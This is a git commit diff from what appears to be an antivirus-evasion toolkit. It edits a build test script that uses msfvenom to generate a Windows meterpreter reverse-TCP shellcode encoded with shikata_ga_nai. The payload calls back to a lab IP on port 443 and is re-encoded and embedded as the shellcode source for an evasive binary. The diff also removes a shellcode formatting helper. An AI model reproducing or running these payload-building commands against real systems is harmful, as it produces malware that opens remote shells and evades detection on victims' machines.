d7739ff28f827a6b88e4c507296a6d44fefe22a1
Florian Saager <florian.saager@rub.de>
2019-01-24 15:47:21 +0100

    Integrated sh_format as avet_encoder

--- build/build_test.sh
+++ build/build_test.sh
@@ -18,7 +18,7 @@ LHOST=$GLOBAL_LHOST
 
 # generate payload
 #msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
-msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.102 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc.txt
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc.txt
 
 # import feature construction interface
 . build/feature_construction.sh
@@ -34,12 +34,12 @@ printf "\n#define HOSTVALUE \"this.that\"" >> source/evasion/evasion.include
 encode_shellcode avet input/sc.txt input/scenc.txt
 # convert generated key from raw to C
 # array name buf is expected by static_from_file retrieval method
-#./tools/data_raw_to_c/data_raw_to_c input/keyraw.txt input/key.txt key
+./tools/data_raw_to_c/data_raw_to_c input/scenc.txt input/scenc_c.txt buf
 
 # set shellcode source
 # convert from raw to C format using the built-in tool
 #./tools/data_raw_to_c/data_raw_to_c input/scenc.txt input/sc.txt buf
-set_shellcode_source static_from_file input/scenc.txt
+set_shellcode_source static_from_file input/scenc_c.txt
 
 # set key source
 set_key_source none
--- tools/format.sh
+++
@@ -1,4 +0,0 @@
-#!/bin/bash
-# This path assumes that format.sh is called from the avet folder, as should be the case then executing build scripts
-./tools/sh_format $1 | tr -d "\n" | tr -d "x" | tr -d "\\" | tr -d "\"" | tr -d ";"
-
